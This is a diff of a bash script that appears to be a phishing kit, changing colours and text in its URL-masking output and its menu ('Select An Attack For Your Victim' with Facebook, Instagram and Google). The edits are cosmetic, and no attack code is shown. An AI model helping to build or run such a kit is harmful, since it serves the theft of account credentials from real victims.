@@ -482,9 +482,9 @@ custom_url() {
 		processed_url="Unable to Short URL"
 	fi
 
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} URL 1 {RED}: ${GREEN}$url"
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} URL 2 {RED}: ${ORANGE}$processed_url"
-	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} URL 3 {RED}: ${ORANGE}$masked_url"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} URL 1 : ${GREEN}$url"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} URL 2 : ${ORANGE}$processed_url"
+	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} URL 3 : ${ORANGE}$masked_url"
 }
 
 ## Facebook
@@ -597,11 +597,11 @@ site_gmail() {
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
+		${RED}[${GREEN}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      
-		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     
-		${RED}[${WHITE}03${RED}]${ORANGE} Google       
+		${RED}[${GREEN}01${RED}]${GREEN} Facebook      
+		${RED}[${GREEN}02${RED}]${GREEN} Instagram     
+		${RED}[${GREEN}03${RED}]${GREEN} Google       
 
 		${RED}[${WHITE}04${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
@@ -616,7 +616,6 @@ main_menu() {
 			site_instagram;;
 		3 | 03)
 			site_gmail;;
-		
 		4 | 04)
 			about;;
 		0 | 00 )
